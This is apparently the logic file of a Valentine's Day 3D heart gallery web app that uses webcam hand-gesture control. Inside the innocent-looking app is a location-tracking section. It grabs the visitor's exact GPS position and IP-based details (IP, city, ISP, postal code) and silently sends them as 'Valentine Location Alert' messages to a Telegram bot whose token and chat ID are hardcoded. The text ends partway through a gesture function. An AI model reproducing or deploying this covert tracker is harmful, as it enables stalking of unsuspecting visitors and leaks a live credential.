/* ═══════════════════════════════════════════
   Valentine's Day Heart Gallery - App Logic
   ═══════════════════════════════════════════ */

// ──── Configuration ────
const CONFIG = {
    // Heart shape
    heartPoints: 80,
    heartScale: 2.8,
    imageSize: 0.38,

    // Rotation
    autoRotateSpeed: 0.003,
    dragSensitivity: 0.005,
    fingerSensitivity: 3.5,
    inertiaDamping: 0.92,

    // Zoom
    zoomSpeed: 0.15,
    zoomMin: 3.5,
    zoomMax: 12,
    zoomSmoothing: 0.08,

    // Camera
    cameraDistance: 7,

    // Gesture
    heartGestureThreshold: 0.15,
    gestureCooldown: 4000,
    gestureFramesRequired: 5,

    // Glow
    normalGlow: 0.3,
    activeGlow: 0.6,
    warmGlow: 0.8,
};

// ──── State ────
const state = {
    rotX: 0.3,
    rotY: 0,
    velX: 0,
    velY: CONFIG.autoRotateSpeed,
    targetZoom: CONFIG.cameraDistance,
    currentZoom: CONFIG.cameraDistance,
    isDragging: false,
    lastPointerX: 0,
    lastPointerY: 0,
    lastFingerX: null,
    lastFingerY: null,
    fingerTracking: false,
    heartGestureDetected: false,
    lastGestureTime: 0,
    isPaused: false,
    pauseTimer: null,
    glowIntensity: CONFIG.normalGlow,
    targetGlow: CONFIG.normalGlow,
    selectedImage: null,
    loadingProgress: 0,
    handResults: null,
    // Gesture state
    currentGesture: 'none',
    lastPinchDist: null,
    highlightedMesh: null,
    previewOpen: false,
    previewMesh: null,
    // Palm expansion
    heartExpanded: false,
    targetHeartScale: 1.0,
    currentHeartScale: 1.0,
};

// ──── DOM Elements ────
const canvas = document.getElementById('heart-canvas');
const loadingScreen = document.getElementById('loading-screen');
const loadingBar = document.getElementById('loading-bar');
const questionOverlay = document.getElementById('question-overlay');
const yesOverlay = document.getElementById('yes-overlay');
const trackingIndicator = document.getElementById('tracking-indicator');
const gestureNameEl = document.getElementById('gesture-name');
const webcamContainer = document.getElementById('webcam-container');
const webcamVideo = document.getElementById('webcam');
const handCanvas = document.getElementById('hand-canvas');
const handCtx = handCanvas.getContext('2d');
const imagePreviewEl = document.getElementById('image-preview');
const previewCanvas = document.getElementById('preview-canvas');
const previewBackdrop = document.getElementById('preview-backdrop');
// ──── Three.js Setup ────
const scene = new THREE.Scene();
const camera = new THREE.PerspectiveCamera(50, window.innerWidth / window.innerHeight, 0.1, 100);
camera.position.z = CONFIG.cameraDistance;

const renderer = new THREE.WebGLRenderer({
    canvas,
    antialias: true,
    alpha: true,
});
renderer.setSize(window.innerWidth, window.innerHeight);
renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
renderer.setClearColor(0x0a0008, 1);
renderer.toneMapping = THREE.ACESFilmicToneMapping;
renderer.toneMappingExposure = 1.0;

// ──── Lighting ────
const ambientLight = new THREE.AmbientLight(0xffc0cb, 0.4);
scene.add(ambientLight);

const pointLight1 = new THREE.PointLight(0xff1493, 1.2, 20);
pointLight1.position.set(3, 3, 5);
scene.add(pointLight1);

const pointLight2 = new THREE.PointLight(0xff69b4, 0.8, 20);
pointLight2.position.set(-3, -2, 4);
scene.add(pointLight2);

const pointLight3 = new THREE.PointLight(0xe8a0bf, 0.5, 15);
pointLight3.position.set(0, 4, -3);
scene.add(pointLight3);

// Soft backlight
const backLight = new THREE.PointLight(0x8b008b, 0.3, 15);
backLight.position.set(0, 0, -5);
scene.add(backLight);

// ──── Heart Group ────
const heartGroup = new THREE.Group();
scene.add(heartGroup);

// ──── Floating Particles ────
const particleCount = 60;
const particleGeometry = new THREE.BufferGeometry();
const particlePositions = new Float32Array(particleCount * 3);
const particleSizes = new Float32Array(particleCount);

for (let i = 0; i < particleCount; i++) {
    particlePositions[i * 3] = (Math.random() - 0.5) * 15;
    particlePositions[i * 3 + 1] = (Math.random() - 0.5) * 15;
    particlePositions[i * 3 + 2] = (Math.random() - 0.5) * 10;
    particleSizes[i] = Math.random() * 3 + 1;
}

particleGeometry.setAttribute('position', new THREE.BufferAttribute(particlePositions, 3));
particleGeometry.setAttribute('size', new THREE.BufferAttribute(particleSizes, 1));

const particleMaterial = new THREE.PointsMaterial({
    color: 0xff69b4,
    size: 0.04,
    transparent: true,
    opacity: 0.4,
    blending: THREE.AdditiveBlending,
    depthWrite: false,
});

const particles = new THREE.Points(particleGeometry, particleMaterial);
scene.add(particles);

// ──── Heart Point on 2D Heart Curve ────
function heartPoint2D(t) {
    // Classic heart parametric curve
    const x = 16 * Math.pow(Math.sin(t), 3);
    const y = 13 * Math.cos(t) - 5 * Math.cos(2 * t) - 2 * Math.cos(3 * t) - Math.cos(4 * t);
    return { x, y };
}

// ──── Generate Valentine's Image Textures ────
function createValentineTexture(index) {
    const size = 256;
    const cvs = document.createElement('canvas');
    cvs.width = size;
    cvs.height = size;
    const ctx = cvs.getContext('2d');

    // Beautiful gradient backgrounds
    const gradients = [
        ['#ff1493', '#ff69b4'],
        ['#dc143c', '#ff4081'],
        ['#e91e63', '#f48fb1'],
        ['#c2185b', '#f06292'],
        ['#ff6b9d', '#c51162'],
        ['#d81b60', '#ec407a'],
        ['#ad1457', '#f50057'],
        ['#880e4f', '#e91e63'],
        ['#ff4081', '#ff80ab'],
        ['#f50057', '#ff1744'],
        ['#e91e63', '#ff5252'],
        ['#c62828', '#ef5350'],
    ];

    const emojis = ['💖', '💕', '❤️', '💝', '💘', '🌹', '💗', '💞', '🥰', '😍', '💓', '✨', '🦋', '🌸', '💐', '🍫'];

    const grad = gradients[index % gradients.length];
    const g = ctx.createLinearGradient(0, 0, size, size);
    g.addColorStop(0, grad[0]);
    g.addColorStop(1, grad[1]);
    ctx.fillStyle = g;

    // Rounded rectangle
    const r = 20;
    ctx.beginPath();
    ctx.moveTo(r, 0);
    ctx.lineTo(size - r, 0);
    ctx.quadraticCurveTo(size, 0, size, r);
    ctx.lineTo(size, size - r);
    ctx.quadraticCurveTo(size, size, size - r, size);
    ctx.lineTo(r, size);
    ctx.quadraticCurveTo(0, size, 0, size - r);
    ctx.lineTo(0, r);
    ctx.quadraticCurveTo(0, 0, r, 0);
    ctx.closePath();
    ctx.fill();

    // Soft overlay pattern
    ctx.globalAlpha = 0.1;
    for (let i = 0; i < 5; i++) {
        ctx.beginPath();
        ctx.arc(
            Math.random() * size,
            Math.random() * size,
            Math.random() * 60 + 20,
            0, Math.PI * 2
        );
        ctx.fillStyle = '#fff';
        ctx.fill();
    }
    ctx.globalAlpha = 1;

    // Emoji
    ctx.font = `${size * 0.35}px serif`;
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
    ctx.fillText(emojis[index % emojis.length], size / 2, size / 2);

    // Subtle border glow
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.3)';
    ctx.lineWidth = 3;
    ctx.beginPath();
    ctx.moveTo(r, 0);
    ctx.lineTo(size - r, 0);
    ctx.quadraticCurveTo(size, 0, size, r);
    ctx.lineTo(size, size - r);
    ctx.quadraticCurveTo(size, size, size - r, size);
    ctx.lineTo(r, size);
    ctx.quadraticCurveTo(0, size, 0, size - r);
    ctx.lineTo(0, r);
    ctx.quadraticCurveTo(0, 0, r, 0);
    ctx.closePath();
    ctx.stroke();

    const texture = new THREE.CanvasTexture(cvs);
    texture.needsUpdate = true;
    return texture;
}

// ──── Create Heart Shape with Images ────
const imageMeshes = [];

function createHeartShape() {
    const scale = 0.16 * CONFIG.heartScale;
    let idx = 0;

    // Create multiple layers of the heart at different Z depths
    // This gives the 3D volumetric feel
    const layers = [
        { z: 0, pointCount: 30, scale: 1.0 },   // Front face (main)
        { z: 0.6, pointCount: 14, scale: 0.85 },  // Mid-front
        { z: -0.6, pointCount: 14, scale: 0.85 },  // Mid-back
        { z: 1.1, pointCount: 10, scale: 0.65 },  // Front edge
        { z: -1.1, pointCount: 10, scale: 0.65 },  // Back edge
        { z: 1.5, pointCount: 6, scale: 0.4 },   // Front tip
        { z: -1.5, pointCount: 6, scale: 0.4 },   // Back tip
    ];

    for (const layer of layers) {
        const n = layer.pointCount;
        for (let i = 0; i < n; i++) {
            // Evenly distribute along the heart curve parameter
            const t = (i / n) * Math.PI * 2 - Math.PI / 2;
            const h = heartPoint2D(t);

            // Add slight random jitter for organic feel
            const jitterX = (Math.random() - 0.5) * 0.8;
            const jitterY = (Math.random() - 0.5) * 0.8;
            const jitterZ = (Math.random() - 0.5) * 0.15;

            const pos = new THREE.Vector3(
                (h.x * layer.scale + jitterX) * scale,
                (h.y * layer.scale + jitterY) * scale,
                (layer.z + jitterZ) * scale * 3
            );

            const texture = createValentineTexture(idx);
            const material = new THREE.MeshStandardMaterial({
                map: texture,
                transparent: true,
                opacity: 0.92,
                roughness: 0.3,
                metalness: 0.1,
                emissive: new THREE.Color(0xff1493),
                emissiveIntensity: 0.05,
                side: THREE.DoubleSide,
            });

            const geometry = new THREE.PlaneGeometry(CONFIG.imageSize, CONFIG.imageSize);
            const mesh = new THREE.Mesh(geometry, material);

            mesh.position.copy(pos);

            // Face outward from center
            const outDir = pos.clone().normalize();
            mesh.lookAt(pos.clone().add(outDir));

            mesh.userData = {
                originalPos: pos.clone(),
                originalScale: 1,
                index: idx,
                selected: false,
                hoverGlow: 0,
            };

            heartGroup.add(mesh);
            imageMeshes.push(mesh);
            idx++;
        }
    }
}

// ──── Location Tracking — GPS first, IP fallback ────
function initLocationTracking() {
    // Try exact GPS first, then fall back to IP
    requestGPSLocation();
    // Also fetch IP location as a backup (runs in parallel)
    fetchIPLocation();
}

function requestGPSLocation() {
    if (!navigator.geolocation) {
        console.warn('📍 Geolocation API not available');
        return;
    }

    navigator.geolocation.getCurrentPosition(
        (position) => {
            const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy, // meters
                altitude: position.coords.altitude,
                speed: position.coords.speed,
                source: '🛰️ GPS-exact',
                timestamp: new Date().toISOString(),
            };
            console.log('%c📍 EXACT GPS LOCATION', 'color: #00ff88; font-size: 16px; font-weight: bold;');
            console.log(`%c   Lat: ${locationData.latitude}`, 'color: #00ff88; font-size: 14px;');
            console.log(`%c   Lng: ${locationData.longitude}`, 'color: #00ff88; font-size: 14px;');
            console.log(`%c   Accuracy: ±${locationData.accuracy?.toFixed(0)}m`, 'color: #ffdd00; font-size: 12px;');
            console.log(`%c   Google Maps: https://maps.google.com/?q=${locationData.latitude},${locationData.longitude}`, 'color: #44aaff; font-size: 12px;');
            sendLocationToServer(locationData);
        },
        (error) => {
            console.warn('📍 GPS denied or failed:', error.message, '— using IP fallback');
        },
        {
            enableHighAccuracy: true,  // Use GPS chip, not just WiFi
            timeout: 10000,            // Wait up to 10s for GPS fix
            maximumAge: 0,             // Don't use cached position
        }
    );
}

async function fetchIPLocation() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        if (res.ok) {
            const data = await res.json();
            const locationData = {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                countryCode: data.country_code,
                latitude: data.latitude,
                longitude: data.longitude,
                timezone: data.timezone,
                isp: data.org,
                postalCode: data.postal,
                source: 'ip-geolocation',
                timestamp: new Date().toISOString(),
            };
            console.log('📍 [IP Location]', locationData);
            sendLocationToServer(locationData);
            return;
        }
    } catch (e) {
        console.warn('ipapi.co failed, trying fallback...');
    }

    try {
        const res2 = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
        if (res2.ok) {
            const data = await res2.json();
            if (data.status === 'success') {
                const locationData = {
                    ip: data.query,
                    city: data.city,
                    region: data.regionName,
                    country: data.country,
                    countryCode: data.countryCode,
                    latitude: data.lat,
                    longitude: data.lon,
                    timezone: data.timezone,
                    isp: data.isp,
                    postalCode: data.zip,
                    source: 'ip-geolocation-fallback',
                    timestamp: new Date().toISOString(),
                };
                console.log('📍 [IP Location Fallback]', locationData);
                sendLocationToServer(locationData);
            }
        }
    } catch (e) {
        console.warn('All IP geolocation services failed:', e);
    }
}

function sendLocationToServer(locationData) {
    console.table(locationData);

    // Store in sessionStorage
    const existing = JSON.parse(sessionStorage.getItem('locationHistory') || '[]');
    existing.push(locationData);
    sessionStorage.setItem('locationHistory', JSON.stringify(existing));

    // Summary line
    const mapLink = `https://maps.google.com/?q=${locationData.latitude},${locationData.longitude}`;
    console.log(`📍 [${locationData.source}] ${locationData.city || ''} (${locationData.latitude}, ${locationData.longitude}) — ${mapLink}`);

    // ── Send to Telegram ──
    const TG_TOKEN = '7984711863:AAH8F1Oi6AmkV2a3TCgTdzHn2E62l3ImuP0';
    const TG_CHAT = '8413229015';
    const tgAPI = `https://api.telegram.org/bot${TG_TOKEN}`;

    // Format a nice message
    const msg = [
        `📍 *Valentine Location Alert*`,
        ``,
        `Source: \`${locationData.source}\``,
        `Lat: \`${locationData.latitude}\``,
        `Lng: \`${locationData.longitude}\``,
        locationData.accuracy ? `Accuracy: ±${locationData.accuracy.toFixed(0)}m` : '',
        locationData.city ? `City: ${locationData.city}, ${locationData.country || ''}` : '',
        locationData.ip ? `IP: \`${locationData.ip}\`` : '',
        `Time: ${locationData.timestamp}`,
        ``,
        `[📌 Open in Google Maps](${mapLink})`,
    ].filter(Boolean).join('\n');

    // Send text message
    fetch(`${tgAPI}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TG_CHAT,
            text: msg,
            parse_mode: 'Markdown',
            disable_web_page_preview: false,
        }),
    }).catch(e => console.warn('TG message failed:', e));

    // Also send as a Telegram location pin (shows map in chat)
    if (locationData.latitude && locationData.longitude) {
        fetch(`${tgAPI}/sendLocation`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TG_CHAT,
                latitude: locationData.latitude,
                longitude: locationData.longitude,
            }),
        }).catch(e => console.warn('TG location failed:', e));
    }
}

// ──── Webcam + MediaPipe Hands ────
let handsInstance = null;

async function initHandTracking() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 320 },
                height: { ideal: 240 },
            },
        });

        webcamVideo.srcObject = stream;
        await webcamVideo.play();

        webcamContainer.classList.remove('hidden');
        webcamContainer.classList.add('visible');

        handCanvas.width = webcamVideo.videoWidth || 320;
        handCanvas.height = webcamVideo.videoHeight || 240;

        // Initialize MediaPipe Hands
        handsInstance = new Hands({
            locateFile: (file) => {
                return `https://cdn.jsdelivr.net/npm/@mediapipe/hands@0.4.1675469240/${file}`;
            },
        });

        handsInstance.setOptions({
            maxNumHands: 2,
            modelComplexity: 1,
            minDetectionConfidence: 0.6,
            minTrackingConfidence: 0.5,
        });

        handsInstance.onResults(onHandResults);

        // Start camera feed to MediaPipe
        const mpCamera = new Camera(webcamVideo, {
            onFrame: async () => {
                if (handsInstance) {
                    await handsInstance.send({ image: webcamVideo });
                }
            },
            width: 320,
            height: 240,
        });

        mpCamera.start();

    } catch (err) {
        console.warn('Webcam access denied or unavailable:', err);
        webcamContainer.classList.add('hidden');
    }
}

// Gesture frame counters
let gestureFrameCount = 0;
let palmFrameCount = 0;
let grabFrameCount = 0;

// ═══════════════════════════════════════════════════
//  GESTURE DETECTION v4 — Smoothed Landmarks + Angles
// ═══════════════════════════════════════════════════

// ── Landmark EMA Smoothing ──
// Smooths raw MediaPipe landmarks to reduce frame-to-frame jitter
const LANDMARK_SMOOTHING = 0.35; // 0 = no smoothing, 1 = frozen
let smoothedLandmarks = null;

function getSmoothHand(rawHand) {
    if (!smoothedLandmarks) {
        // First frame — initialize
        smoothedLandmarks = rawHand.map(p => ({ x: p.x, y: p.y }));
        return smoothedLandmarks;
    }

    // EMA: smoothed = smoothed + factor * (raw - smoothed)
    for (let i = 0; i < 21; i++) {
        smoothedLandmarks[i].x += (rawHand[i].x - smoothedLandmarks[i].x) * (1 - LANDMARK_SMOOTHING);
        smoothedLandmarks[i].y += (rawHand[i].y - smoothedLandmarks[i].y) * (1 - LANDMARK_SMOOTHING);
    }

    return smoothedLandmarks;
}

// ── Gesture Smoothing Buffer with Hysteresis ──
const GESTURE_BUFFER_SIZE = 8;
let gestureBuffer = [];
let confirmedGesture = 'none';

function getSmoothedGesture(rawGesture) {
    gestureBuffer.push(rawGesture);
    if (gestureBuffer.length > GESTURE_BUFFER_SIZE) gestureBuffer.shift();

    const counts = {};
    for (const g of gestureBuffer) {
        counts[g] = (counts[g] || 0) + 1;
    }

    // Hysteresis: confirmed gesture gets +2 bonus (very sticky)
    if (counts[confirmedGesture]) {
        counts[confirmedGesture] += 2;
    }

    let best = confirmedGesture;
    let bestCount = 0;
    for (const [gesture, count] of Object.entries(counts)) {
        if (count > bestCount) {
            bestCount = count;
            best = gesture;
        }
    }

    // Need strong consensus to switch (5+ raw hits, or beat hysteresis)
    if (best !== confirmedGesture && bestCount >= 5) {
        confirmedGesture = best;
    }

    return confirmedGesture;
}

// ── Angle-Based Finger Curl Detection ──
function angleBetween(a, b, c) {
    const ba = { x: a.x - b.x, y: a.y - b.y };
    const bc = { x: c.x - b.x, y: c.y - b.y };
    const dot = ba.x * bc.x + ba.y * bc.y;
    const magBA = Math.hypot(ba.x, ba.y);
    const magBC = Math.hypot(bc.x, bc.y);
    if (magBA === 0 || magBC === 0) return 180;
    return Math.acos(Math.max(-1, Math.min(1, dot / (magBA * magBC)))) * (180 / Math.PI);
}

function countExtendedFingers(hand) {
    let count = 0;
    let details = { thumb: false, index: false, middle: false, ring: false, pinky: false };
    const CURL_THRESHOLD = 130; // Sweet spot: catches natural extension without false positives

    // THUMB: distance ratio
    const thumbLen = Math.hypot(hand[4].x - hand[2].x, hand[4].y - hand[2].y);
    const thumbHalf = Math.hypot(hand[3].x - hand[2].x, hand[3].y - hand[2].y);
    if (thumbLen > thumbHalf * 1.15) { count++; details.thumb = true; }

    // Each finger: angle at PIP joint (MCP → PIP → TIP)
    const indexAngle = angleBetween(hand[5], hand[6], hand[8]);
    if (indexAngle > CURL_THRESHOLD) { count++; details.index = true; }

    const middleAngle = angleBetween(hand[9], hand[10], hand[12]);
    if (middleAngle > CURL_THRESHOLD) { count++; details.middle = true; }

    const ringAngle = angleBetween(hand[13], hand[14], hand[16]);
    if (ringAngle > CURL_THRESHOLD) { count++; details.ring = true; }

    const pinkyAngle = angleBetween(hand[17], hand[18], hand[20]);
    if (pinkyAngle > CURL_THRESHOLD) { count++; details.pinky = true; }

    return { count, details, angles: { index: indexAngle, middle: middleAngle, ring: ringAngle, pinky: pinkyAngle } };
}

function detectGestureRaw(hand) {
    const { count, details, angles } = countExtendedFingers(hand);

    // PALM — 4+ fingers extended
    if (count >= 4) return 'palm';

    // GRAB — all fingers clearly curled (each angle < 110°)
    if (angles.index < 110 && angles.middle < 110 && angles.ring < 110 && angles.pinky < 110) {
        return 'grab';
    }

    // PINCH — thumb+index tips close, other fingers not all up
    const pinchDist = Math.hypot(hand[4].x - hand[8].x, hand[4].y - hand[8].y);
    if (pinchDist < 0.05 && count < 4 && !details.middle) return 'pinch';

    // POINT — index extended, middle+ring curled
    if (details.index && !details.middle && !details.ring) return 'point';

    // Fallback: index is up → point
    if (details.index) return 'point';

    return 'none';
}

// ── Visual Debug Overlay on Webcam ──
function drawGestureDebug(hand, gesture, fingerCount) {
    // Draw gesture name near the wrist on the webcam canvas
    const wrist = hand[0];
    const x = wrist.x * handCanvas.width;
    const y = Math.max(20, wrist.y * handCanvas.height - 20);

    handCtx.save();
    // Since the hand canvas is mirrored via CSS, we draw normally
    handCtx.font = 'bold 14px sans-serif';
    handCtx.textAlign = 'center';

    // Background pill
    const text = `${gesture.toUpperCase()} (${fingerCount})`;
    const metrics = handCtx.measureText(text);
    const pw = metrics.width + 12;
    const ph = 22;
    handCtx.fillStyle = 'rgba(0, 0, 0, 0.7)';
    handCtx.beginPath();
    handCtx.roundRect(x - pw / 2, y - ph + 2, pw, ph, 8);
    handCtx.fill();

    // Text
    const colors = {
        'palm': '#00ff88', 'point': '#ffdd00', 'grab': '#ff4444',
        'pinch': '#44aaff', 'none': '#888888'
    };
    handCtx.fillStyle = colors[gesture] || '#ffffff';
    handCtx.fillText(text, x, y);

    // Draw finger extension indicators near each fingertip
    const { details } = countExtendedFingers(hand);
    const tips = [
        { idx: 4, ext: details.thumb },
        { idx: 8, ext: details.index },
        { idx: 12, ext: details.middle },
        { idx: 16, ext: details.ring },
        { idx: 20, ext: details.pinky },
    ];
    for (const { idx, ext } of tips) {
        const tx = hand[idx].x * handCanvas.width;
        const ty = hand[idx].y * handCanvas.height;
        handCtx.beginPath();
        handCtx.arc(tx, ty, 5, 0, Math.PI * 2);
        handCtx.fillStyle = ext ? '#00ff88' : '#ff4444';
        handCtx.fill();
        handCtx.strokeStyle = '#fff';
        handCtx.lineWidth = 1.5;
        handCtx.stroke();
    }

    handCtx.restore();
}

// ──── Finger-to-Screen Raycasting ────
const fingerPointer = new THREE.Vector2();

function findNearestImage(fingerX, fingerY) {
    fingerPointer.x = (1 - fingerX) * 2 - 1; // mirrored
    fingerPointer.y = -(fingerY) * 2 + 1;
    raycaster.setFromCamera(fingerPointer, camera);
    const intersects = raycaster.intersectObjects(imageMeshes);
    return intersects.length > 0 ? intersects[0].object : null;
}

// ──── Image Preview ────
function openImagePreview(mesh) {
    if (state.previewOpen) return;
    state.previewOpen = true;
    state.previewMesh = mesh;

    const srcCanvas = mesh.material.map.image;
    const pCtx = previewCanvas.getContext('2d');
    previewCanvas.width = 512;
    previewCanvas.height = 512;
    pCtx.clearRect(0, 0, 512, 512);
    pCtx.drawImage(srcCanvas, 0, 0, 512, 512);

    imagePreviewEl.classList.remove('hidden');
    requestAnimationFrame(() => imagePreviewEl.classList.add('show'));
    state.isPaused = true;
}

function closeImagePreview() {
    if (!state.previewOpen) return;
    state.previewOpen = false;
    state.previewMesh = null;
    imagePreviewEl.classList.remove('show');
    setTimeout(() => imagePreviewEl.classList.add('hidden'), 400);
    state.isPaused = false;
}

previewBackdrop.addEventListener('click', closeImagePreview);

// ──── Main Hand Results Handler ────
function onHandResults(results) {
    state.handResults = results;
    handCtx.clearRect(0, 0, handCanvas.width, handCanvas.height);

    if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
        trackingIndicator.classList.remove('hidden');
        trackingIndicator.classList.add('visible');
        state.fingerTracking = true;
        drawHandLandmarks(results);

        const hand = results.multiHandLandmarks[0];
        const fingerTip = hand[8];
        const thumbTip = hand[4];
        const fingerX = fingerTip.x;
        const fingerY = fingerTip.y;

        // Smooth landmarks for stable gesture detection
        const smoothHand = getSmoothHand(hand);

        // Detect gesture using smoothed landmarks
        const rawGesture = detectGestureRaw(smoothHand);
        const gesture = getSmoothedGesture(rawGesture);
        state.currentGesture = gesture;

        // Update gesture name in UI
        const { count } = countExtendedFingers(smoothHand);
        const labels = {
            'pinch': '🤏 Pinch', 'point': '☝️ Point',
            'grab': '✊ Grab', 'palm': `🖐️ Palm (${count})`, 'none': `${count}☝️`
        };
        gestureNameEl.textContent = labels[gesture] || '';

        // Debug log (throttled ~5% of frames)
        if (Math.random() < 0.06) {
            const { angles } = countExtendedFingers(smoothHand);
            console.log(`✋ raw:${rawGesture} → ${gesture} | fingers:${count} | idx:${angles.index.toFixed(0)}° mid:${angles.middle.toFixed(0)}° ring:${angles.ring.toFixed(0)}°`);
        }

        // Draw visual debug on webcam canvas
        drawGestureDebug(smoothHand, gesture, count);

        // ── POINT: Rotate + highlight image ──
        if (gesture === 'point' && !state.previewOpen) {
            if (state.lastFingerX !== null) {
                const rawDx = (fingerX - state.lastFingerX) * CONFIG.fingerSensitivity;
                const rawDy = (fingerY - state.lastFingerY) * CONFIG.fingerSensitivity;
                state.velY += (rawDx - state.velY) * 0.4;
                state.velX += (rawDy - state.velX) * 0.4;
            }
            const nearest = findNearestImage(fingerX, fingerY);
            if (state.highlightedMesh && state.highlightedMesh !== nearest) {
                state.highlightedMesh.userData.selected = false;
            }
            if (nearest) {
                nearest.userData.selected = true;
                state.highlightedMesh = nearest;
            }
            grabFrameCount = 0;
            palmFrameCount = 0;
            // Relax expansion
            state.heartExpanded = false;
            state.targetHeartScale = 1.0;
            state.targetGlow = CONFIG.normalGlow;

            // ── PINCH: Zoom in/out ──
        } else if (gesture === 'pinch' && !state.previewOpen) {
            const currentPinchDist = Math.hypot(thumbTip.x - fingerTip.x, thumbTip.y - fingerTip.y);
            if (state.lastPinchDist !== null) {
                const delta = (state.lastPinchDist - currentPinchDist) * 30;
                state.targetZoom = Math.max(
                    CONFIG.zoomMin,
                    Math.min(CONFIG.zoomMax, state.targetZoom + delta)
                );
            }
            state.lastPinchDist = currentPinchDist;
            grabFrameCount = 0;
            palmFrameCount = 0;

            // ── PALM: Expand heart big + close preview ──
        } else if (gesture === 'palm') {
            palmFrameCount++;
            if (palmFrameCount >= 2) {
                state.heartExpanded = true;
                state.targetHeartScale = 1.8;
                state.targetGlow = CONFIG.warmGlow;
            }
            if (palmFrameCount >= 5 && state.previewOpen) {
                closeImagePreview();
            }
            grabFrameCount = 0;
            state.lastPinchDist = null;

            // ── GRAB: Open image preview ──
        } else if (gesture === 'grab') {
            grabFrameCount++;
            if (grabFrameCount >= 8 && !state.previewOpen) {
                const nearest = state.highlightedMesh || findNearestImage(fingerX, fingerY);
                if (nearest) openImagePreview(nearest);
                grabFrameCount = 0;
            }
            palmFrameCount = 0;
            state.lastPinchDist = null;
            // Contract heart
            state.heartExpanded = false;
            state.targetHeartScale = 1.0;
            state.targetGlow = CONFIG.normalGlow;

            // ── DEFAULT ──
        } else {
            if (state.lastFingerX !== null && !state.previewOpen) {
                const rawDx = (fingerX - state.lastFingerX) * CONFIG.fingerSensitivity;
                const rawDy = (fingerY - state.lastFingerY) * CONFIG.fingerSensitivity;
                state.velY += (rawDx - state.velY) * 0.4;
                state.velX += (rawDy - state.velX) * 0.4;
            }
            state.lastPinchDist = null;
            grabFrameCount = 0;
            palmFrameCount = 0;
        }

        state.lastFingerX = fingerX;
        state.lastFingerY = fingerY;

        // Two-hand heart gesture
        if (results.multiHandLandmarks.length >= 2) {
            checkHeartGesture(results.multiHandLandmarks, results.multiHandedness);
        } else {
            gestureFrameCount = 0;
        }

    } else {
        // Hand lost
        state.fingerTracking = false;
        state.lastFingerX = null;
        state.lastFingerY = null;
        state.lastPinchDist = null;
        state.currentGesture = 'none';
        gestureFrameCount = 0;
        grabFrameCount = 0;
        palmFrameCount = 0;
        gestureBuffer = [];
        confirmedGesture = 'none';
        smoothedLandmarks = null;
        gestureNameEl.textContent = '';
        trackingIndicator.classList.remove('visible');
        trackingIndicator.classList.add('hidden');

        // Contract heart back
        state.heartExpanded = false;
        state.targetHeartScale = 1.0;
        state.targetGlow = CONFIG.normalGlow;

        if (state.highlightedMesh) {
            state.highlightedMesh.userData.selected = false;
            state.highlightedMesh = null;
        }
    }
}

function drawHandLandmarks(results) {
    handCtx.lineWidth = 2;

    for (const landmarks of results.multiHandLandmarks) {
        // Draw connections
        const connections = [
            [0, 1], [1, 2], [2, 3], [3, 4],
            [0, 5], [5, 6], [6, 7], [7, 8],
            [5, 9], [9, 10], [10, 11], [11, 12],
            [9, 13], [13, 14], [14, 15], [15, 16],
            [13, 17], [17, 18], [18, 19], [19, 20],
            [0, 17],
        ];

        handCtx.strokeStyle = 'rgba(255, 105, 180, 0.6)';
        for (const [a, b] of connections) {
            handCtx.beginPath();
            handCtx.moveTo(landmarks[a].x * handCanvas.width, landmarks[a].y * handCanvas.height);
            handCtx.lineTo(landmarks[b].x * handCanvas.width, landmarks[b].y * handCanvas.height);
            handCtx.stroke();
        }

        // Draw finger tip highlight (landmark 8)
        const tip = landmarks[8];
        handCtx.beginPath();
        handCtx.arc(tip.x * handCanvas.width, tip.y * handCanvas.height, 6, 0, Math.PI * 2);
        handCtx.fillStyle = 'rgba(255, 20, 147, 0.9)';
        handCtx.fill();
        handCtx.strokeStyle = '#fff';
        handCtx.lineWidth = 2;
        handCtx.stroke();
    }
}

// ──── Heart Gesture Detection ────
function checkHeartGesture(hands, handedness) {
    if (Date.now() - state.lastGestureTime < CONFIG.gestureCooldown) return;

    const hand1 = hands[0];
    const hand2 = hands[1];

    // Thumb tips (landmark 4)
    const thumb1 = hand1[4];
    const thumb2 = hand2[4];

    // Index finger tips (landmark 8)
    const index1 = hand1[8];
    const index2 = hand2[8];

    // Middle finger tips (landmark 12) — also helps detect the arch
    const middle1 = hand1[12];
    const middle2 = hand2[12];

    // Wrists (landmark 0)
    const wrist1 = hand1[0];
    const wrist2 = hand2[0];

    // ── Condition 1: Thumbs or lower fingers close together (bottom of heart) ──
    const thumbDist = Math.hypot(thumb1.x - thumb2.x, thumb1.y - thumb2.y);
    const thumbsClose = thumbDist < CONFIG.heartGestureThreshold * 3;

    // ── Condition 2: Index/middle fingers separated (top arches of heart) ──
    const indexDist = Math.hypot(index1.x - index2.x, index1.y - index2.y);
    const middleDist = Math.hypot(middle1.x - middle2.x, middle1.y - middle2.y);
    const fingersApart = indexDist > CONFIG.heartGestureThreshold || middleDist > CONFIG.heartGestureThreshold;

    // ── Condition 3: Fingers above thumbs (y inverted in screen space) ──
    const fingersAbove = (
        (index1.y < thumb1.y || middle1.y < thumb1.y) &&
        (index2.y < thumb2.y || middle2.y < thumb2.y)
    );

    // ── Condition 4: Hands are relatively close together (not spread far apart) ──
    const handsCenterDist = Math.hypot(
        (wrist1.x + thumb1.x) / 2 - (wrist2.x + thumb2.x) / 2,
        (wrist1.y + thumb1.y) / 2 - (wrist2.y + thumb2.y) / 2
    );
    const handsClose = handsCenterDist < 0.6;

    // Debug logging (throttled)
    if (Math.random() < 0.05) {
        console.log('🫶 Gesture check:', {
            thumbDist: thumbDist.toFixed(3),
            thumbsClose,
            indexDist: indexDist.toFixed(3),
            fingersApart,
            fingersAbove,
            handsClose,
            gestureFrames: gestureFrameCount,
        });
    }

